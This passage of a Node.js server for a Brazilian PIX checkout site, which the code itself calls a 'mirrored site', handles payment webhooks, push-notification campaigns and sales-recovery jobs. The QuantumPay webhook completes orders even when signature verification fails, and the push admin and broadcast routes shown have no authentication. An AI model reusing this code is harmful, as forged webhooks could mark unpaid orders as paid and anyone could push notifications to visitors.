        provider: 'nitropay',
        channel: 'direct',
        customer: {
          name: data.customer?.name || '',
          document: data.customer?.document || '',
          email: data.customer?.email || '',
          phone: data.customer?.phone || '',
        },
      });
    }

    const isPaid = event === 'transaction.paid' || ['paid', 'pago', 'approved', 'confirmado'].includes(status);

    if (order && isPaid) {
      store.completeOrder(order.id, 'nitropay-webhook', payload);
      const updated = store.getOrder(order.id) || order;
      updated.status = 'COMPLETED';
      updated.channel = order.channel || updated.channel || 'standard';
      logOrder('completed', updated, { source: 'nitropay-webhook', payer: data.customer });
      console.log(`[webhook] Pagamento confirmado para ordem ${order.id}`);
    }

    return sendJson(req, res, 200, {
      received: true,
      orderId: order?.id || null,
      status: order ? store.getOrder(order.id).status : 'unknown',
    });
  }

  /* ---------------------------- webhook quantumpay -------------------------- */
  if ((pathname === '/api/webhooks/quantumpay' || pathname === '/api/webhooks/quantum') && method === 'POST') {
    const raw = await readRaw(req);
    let payload = {};
    try { payload = JSON.parse(raw.toString('utf8')); } catch { /* corpo não-JSON */ }

    const signature = req.headers['x-signature'] || '';
    const verified = quantumpay.verifyWebhook(raw.toString('utf8'), signature);

    const event = String(payload.event || '').toLowerCase();
    const data = payload.data || payload;
    const txId = data.id || payload.id;
    const externalId = data.externalId || data.external_id || payload.externalId;
    const status = String(data.status || payload.status || '').toLowerCase();

    let order = (externalId && store.findByExternalId(externalId)) || (txId && store.findByTransactionId(txId));

    if (!order && externalId) {
      order = store.createOrder({
        id: externalId,
        externalId,
        transactionId: txId || null,
        status: 'PENDING',
        amount: Number(data.amountInCents ? data.amountInCents / 100 : (data.amount || payload.amount || 0)),
        totalPrice: Number(data.amountInCents ? data.amountInCents / 100 : (data.amount || payload.amount || 0)),
        provider: 'quantumpay',
        channel: 'standard',
        customer: {
          name: data.customer?.name || '',
          document: data.customer?.document || '',
          email: data.customer?.email || '',
          phone: data.customer?.phone || '',
        },
      });
    }

    const isPaid = event === 'transaction_paid' || ['paid', 'pago', 'completed', 'approved', 'confirmado'].includes(status);

    if (order && isPaid) {
      store.completeOrder(order.id, verified ? 'quantumpay-webhook' : 'quantumpay-webhook-direct', payload);
      const updated = store.getOrder(order.id) || order;
      updated.status = 'COMPLETED';
      logOrder('completed', updated, { source: 'quantumpay-webhook', payer: data.customer });
      console.log(`[webhook-quantumpay] Pagamento confirmado para ordem ${order.id} (R$ ${order.amount})`);
      const v = updated.visitorId ? store.getVisitor(updated.visitorId) : null;
      utmify.notifyPixPaid(updated, v).catch(() => {});
    }

    return sendJson(req, res, 200, {
      received: true,
      orderId: order?.id || null,
      status: order ? store.getOrder(order.id).status : 'unknown',
    });
  }

  /* ----------------------------------- CEP ---------------------------------- */
  const cepMatch = pathname.match(/^\/api\/cep\/(\d{5}-?\d{3})$/);
  if (cepMatch) {
    try {
      return sendJson(req, res, 200, await cep.lookup(cepMatch[1]));
    } catch (e) {
      return fail(req, res, e.status || 502, e.message);
    }
  }

  /* -------------------------- web push notifications ----------------------- */
  if (pathname === '/api/push/vapid-public-key' && method === 'GET') {
    return sendJson(req, res, 200, {
      publicKey: config.push.vapidPublicKey,
    });
  }

  if (pathname === '/api/push/subscriptions' && method === 'POST') {
    const body = await readJson(req);
    try {
      const saved = pushService.saveSubscription({
        visitorId: body.visitorId,
        subscription: body.subscription,
        isTest: body.isTest,
        previousEndpoint: body.previousEndpoint,
        ip,
        userAgent: req.headers['user-agent'] || '',
      });
      if (body.visitorId) {
        store.updateVisitor(body.visitorId, { pushSubscribed: true });
      }
      if (body.sendWelcome) {
        pushService.sendNotification(saved, {
          title: '🔔 Notificações Ativadas com Sucesso!',
          body: 'Você receberá atualizações sobre a liberação do seu crédito aqui no seu celular.',
          targetUrl: '/retomar',
        }).catch(() => {});
      }
      triggerAutoRecoveryThrottled();
      return sendJson(req, res, 200, { ok: true, id: saved.endpoint });
    } catch (e) {
      return fail(req, res, 400, e.message);
    }
  }

  /* -------------------------- web push - recuperação & retomada ------------ */
  const recoverMatch = pathname.match(/^\/api\/push\/recover\/([\w-]+)$/);
  if (recoverMatch && method === 'GET') {
    return sendJson(req, res, 200, recovery.findVisitorForRecovery(recoverMatch[1]));
  }

  if ((pathname === '/api/push/cron-recovery' || pathname === '/api/push/recovery/run') && (method === 'GET' || method === 'POST')) {
    const result = await recovery.processAutomatedRecovery();
    return sendJson(req, res, 200, result);
  }

  /* -------------------------- web push - admin & campanhas ------------------ */
  if (pathname === '/api/push/config') {
    if (method === 'GET') {
      return sendJson(req, res, 200, {
        configured: config.push.configured,
        publicKey: config.push.vapidPublicKey,
        totalSubscriptions: pushService.getSubscriptions().length,
        ...pushAdmin.getConfig(),
      });
    }
    if (method === 'PATCH' || method === 'POST') {
      const body = await readJson(req);
      return sendJson(req, res, 200, pushAdmin.updateConfig(body.data || body));
    }
  }

  if (pathname === '/api/push/audience-count' && (method === 'GET' || method === 'POST')) {
    let audience = [];
    if (method === 'POST') {
      const body = await readJson(req);
      audience = body.data?.audience || body.audience || [];
    }
    return sendJson(req, res, 200, pushAdmin.countAudience(audience));
  }

  // Modelos (Templates)
  const templateMatch = pathname.match(/^\/api\/push\/templates\/([\w-]+)$/);
  if (templateMatch) {
    const id = templateMatch[1];
    if (method === 'PATCH' || method === 'PUT') {
      const body = await readJson(req);
      const updated = pushAdmin.updateTemplate(id, body.data || body);
      return updated ? sendJson(req, res, 200, updated) : fail(req, res, 404, 'Modelo não encontrado');
    }
    if (method === 'DELETE') {
      pushAdmin.deleteTemplate(id);
      return sendJson(req, res, 200, { ok: true });
    }
  }

  if (pathname === '/api/push/templates') {
    if (method === 'GET') return sendJson(req, res, 200, pushAdmin.getTemplates());
    if (method === 'POST') {
      const body = await readJson(req);
      return sendJson(req, res, 200, pushAdmin.createTemplate(body.data || body));
    }
  }

  // Grupos (Segmentos)
  if (pathname === '/api/push/groups') {
    if (method === 'GET') return sendJson(req, res, 200, pushAdmin.getGroups());
    if (method === 'POST') {
      const body = await readJson(req);
      return sendJson(req, res, 200, pushAdmin.createGroup(body.data || body));
    }
  }

  // Links
  if (pathname === '/api/push/links') {
    if (method === 'GET') return sendJson(req, res, 200, pushAdmin.getLinks());
    if (method === 'POST') {
      const body = await readJson(req);
      return sendJson(req, res, 200, pushAdmin.createLink(body.data || body));
    }
  }

  // Mídia
  if (pathname === '/api/push/media') {
    if (method === 'GET') return sendJson(req, res, 200, pushAdmin.getMedia());
    if (method === 'POST') {
      const body = await readJson(req);
      return sendJson(req, res, 200, pushAdmin.createMedia(body.data || body));
    }
  }

  // Execuções de Disparo
  const executionFailuresMatch = pathname.match(/^\/api\/push\/executions\/([\w-]+)\/failures$/);
  if (executionFailuresMatch && method === 'GET') {
    return sendJson(req, res, 200, []);
  }

  const executionCancelMatch = pathname.match(/^\/api\/push\/executions\/([\w-]+)\/cancel$/);
  if (executionCancelMatch && method === 'POST') {
    return sendJson(req, res, 200, { ok: true });
  }

  const executionMatch = pathname.match(/^\/api\/push\/executions\/([\w-]+)$/);
  if (executionMatch && method === 'GET') {
    const list = pushAdmin.getExecutions();
    const item = list.find((e) => e.id === executionMatch[1]);
    return item ? sendJson(req, res, 200, item) : fail(req, res, 404, 'Execução não encontrada');
  }

  if (pathname === '/api/push/executions') {
    if (method === 'GET') {
      const date = searchParams.get('date') || '';
      return sendJson(req, res, 200, pushAdmin.getExecutions({ date }));
    }
    if (method === 'POST') {
      const body = await readJson(req);
      const execution = await pushAdmin.createExecution(body.data || body);
      return sendJson(req, res, 200, execution);
    }
  }

  if ((pathname === '/api/push/test' || pathname === '/api/push/send-test-now') && (method === 'GET' || method === 'POST')) {
    let data = {
      title: '🔔 Teste Valore: Notificação Recebida!',
      body: 'Suas notificações push estão ativas e funcionando perfeitamente no seu celular.',
      targetUrl: '/retomar',
    };
    let isTestFilter = null;

    if (method === 'POST') {
      try {
        const body = await readJson(req);
        if (body.title || body.body || body.data) {
          data = body.data || body;
        }
        if (body.isTest !== undefined) isTestFilter = Boolean(body.isTest);
      } catch {}
    }

    const result = await pushService.broadcast(data, { isTest: isTestFilter });
    if (result.total === 0) {
      const allSubs = pushService.getSubscriptions();
      if (allSubs.length > 0) {
        const last = allSubs[allSubs.length - 1];
        const singleRes = await pushService.sendNotification(last, data);
        return sendJson(req, res, 200, {
          ok: singleRes.ok,
          sent: singleRes.ok ? 1 : 0,
          total: 1,
          error: singleRes.error,
          message: singleRes.ok ? 'Notificação de teste disparada com sucesso para 1 aparelho!' : 'Falha ao disparar para o aparelho.',
        });
      }
    }
    return sendJson(req, res, 200, {
      ...result,
      message: result.sent > 0
        ? `Notificação enviada com sucesso para ${result.sent} aparelho(s)!`
        : 'Nenhuma notificação enviada. Ative as notificações no navegador primeiro.',
    });
  }

  return fail(req, res, 404, `Rota não encontrada: ${method} ${pathname}`);
}

/** Confirma a ordem consultando o gateway (usado quando não há webhook_secret). */
async function confirmOnGateway(order, txId) {
  if (order.provider === 'quantumpay' || config.quantumpay?.configured) {
    try {
      const check = await quantumpay.isChargePaid({
        externalId: order.externalId,
        transactionId: order.transactionId || txId,
      });
      if (check.paid) return true;
    } catch (e) {
      console.warn('[webhook] não foi possível confirmar na QuantumPay:', e.message);
    }
  }
  if (!config.bspay.configured) return false;
  try {
    const check = await bspay.isChargePaid({
      externalId: order.externalId,
      transactionId: order.transactionId || txId,
    });
    return !!check.paid;
  } catch (e) {
    console.warn('[webhook] não foi possível confirmar na BSPay:', e.message);
    return false;
  }
}

const ALPHABET = 'abcdefghijklmnopqrstuvwxyz0123456789';
function makeExternalId() {
  let r = '';
  for (let i = 0; i < 8; i++) r += ALPHABET[Math.floor(Math.random() * ALPHABET.length)];
  return `valore-${Date.now().toString(36)}${r}`;
}

/* ------------------------------ arquivos estáticos ------------------------- */

function serveStatic(req, res, url) {
  let rel = decodeURIComponent(url.pathname);
  if (rel.endsWith('/')) rel += 'index.html';

  const file = path.join(PUBLIC_DIR, path.normalize(rel).replace(/^([/\\])+/, ''));
  if (!file.startsWith(PUBLIC_DIR)) return sendText(res, 403, 'Acesso negado', req);

  const exists = fs.existsSync(file) && fs.statSync(file).isFile();
  if (!exists) {
    /* SPA: rota sem extensão cai no index (roteador client-side). */
    if (path.extname(rel)) return sendText(res, 404, 'Arquivo não encontrado', req);
    return serveFile(res, path.join(PUBLIC_DIR, 'index.html'), req);
  }
  return serveFile(res, file, req);
}

function serveFile(res, file, req) {
  const ext = path.extname(file).toLowerCase();
  const isHtml = ext === '.html';
  const isSw = path.basename(file) === 'sw.js';
  /* Assets têm hash no nome -> cache longo. HTML e sw.js sempre revalidados. */
  const immutable = /-[A-Za-z0-9_]{8,}\.(js|css)$/.test(path.basename(file));
  try {
    const data = fs.readFileSync(file);
    const headers = {
      'Content-Type': MIME[ext] || 'application/octet-stream',
      'Cache-Control': (isHtml || isSw) ? 'no-cache, no-store, must-revalidate' : (immutable ? 'public, max-age=31536000, immutable' : 'public, max-age=3600'),
      'Content-Length': data.length,
      ...baseHeaders(req),
    };
    if (isSw) {
      headers['Service-Worker-Allowed'] = '/';
    }
    res.writeHead(200, headers);
    res.end(data);
  } catch {
    sendText(res, 500, 'Falha ao ler arquivo', req);
  }
}

function sendText(res, status, text, req) {
  res.writeHead(status, { 'Content-Type': 'text/plain; charset=utf-8', ...baseHeaders(req) });
  res.end(text);
}

/* ----------------------------------- server -------------------------------- */

async function handler(req, res) {
  const started = Date.now();
  const proto = req.headers['x-forwarded-proto'] || 'http';
  const host = req.headers['x-forwarded-host'] || req.headers.host || '127.0.0.1';
  const url = new URL(req.url, `${proto}://${host}`);
  try {
    if (url.pathname.startsWith('/api/')) {
      await handleApi(req, res, url);
    } else {
      serveStatic(req, res, url);
    }
  } catch (err) {
    console.error('[erro]', err.message);
    if (!res.headersSent) fail(req, res, err.status || 500, err.message || 'Erro interno');
    else res.end();
  }
  if (process.env.ACCESS_LOG === '1') {
    console.log(`${new Date().toISOString()} ${req.method} ${url.pathname} ${res.statusCode} ${Date.now() - started}ms`);
  }
}

const server = http.createServer(handler);

/** Avisos de configuração que importam em produção. */
function preflight() {
  const warns = [];
  const errors = [];

  if (config.isProd) {
    if (config.allowMockPix) warns.push('ALLOW_MOCK_PIX está ativo em produção: PIX pode ser gerado em modo local se a BSPay falhar. Use ALLOW_MOCK_PIX=0.');
    if (!config.bspay.configured) errors.push('BSPAY_CLIENT_ID/BSPAY_CLIENT_SECRET não configurados — nenhum PIX será criado na BSPay.');
    if (config.bspay.postbackUrl && /SEU_DOMINIO/i.test(config.bspay.postbackUrl) && !config.publicBaseUrl) {
      warns.push('BSPAY_POSTBACK_URL ainda é o exemplo — o webhook usará o padrão da credencial.');
    }
    if (!config.bspay.webhookSecured) warns.push('BSPAY_WEBHOOK_SECRET ausente: webhooks serão confirmados por consulta à API (mais lento, porém seguro).');
  }

  for (const w of warns) console.warn(`  [aviso] ${w}`);
  for (const e of errors) console.error(`  [erro ] ${e}`);
  return errors.length === 0;
}

if (require.main === module) {
  const ready = preflight();
  server.listen(config.port, config.host, () => {
    const shown = config.publicBaseUrl || `http://127.0.0.1:${config.port}`;
    console.log(`\n  ${config.brand.name} — site espelhado no ar (${config.nodeEnv})`);
    console.log(`  site        ${shown}`);
    console.log(`  API         ${shown}/api/health`);
    console.log(`  escutando   ${config.host}:${config.port}`);
    console.log(`  BSPay       ${config.bspay.configured ? `configurada (${config.bspay.apiBase})` : 'NÃO configurada'}`);
    console.log(`  webhook     ${config.bspay.webhookSecured ? 'assinatura HMAC validada' : 'sem segredo: confirmação via API'}`);
    console.log(`  PIX local   ${config.allowMockPix ? 'permitido' : 'desabilitado'}`);
    console.log(`  API de CPF  ${config.cpf.configured ? 'configurada' : 'token placeholder'}`);
    if (!ready) console.warn('  [atenção] corrija os erros acima antes de receber tráfego.\n');

    // Automação periódica de recuperação de vendas e conversão (a cada 2 minutos)
    setInterval(async () => {
      try {
        await recovery.processAutomatedRecovery();
      } catch (err) {
        console.warn('[recovery-cron] Falha ao processar recuperação:', err.message);
      }
    }, 2 * 60 * 1000).unref();
  });

  const shutdown = (sig) => {
    console.log(`\n${sig} recebido, encerrando...`);
    server.close(() => { store.flushNow(); process.exit(0); });
    setTimeout(() => { store.flushNow(); process.exit(0); }, 5000).unref();
  };
  process.on('SIGINT', () => shutdown('SIGINT'));
  process.on('SIGTERM', () => shutdown('SIGTERM'));
  process.on('unhandledRejection', (e) => console.error('[unhandledRejection]', e));
  process.on('uncaughtException', (e) => { console.error('[uncaughtException]', e); store.flushNow(); });
}

handler.server = server;
handler.handleApi = handleApi;

module.exports = handler;
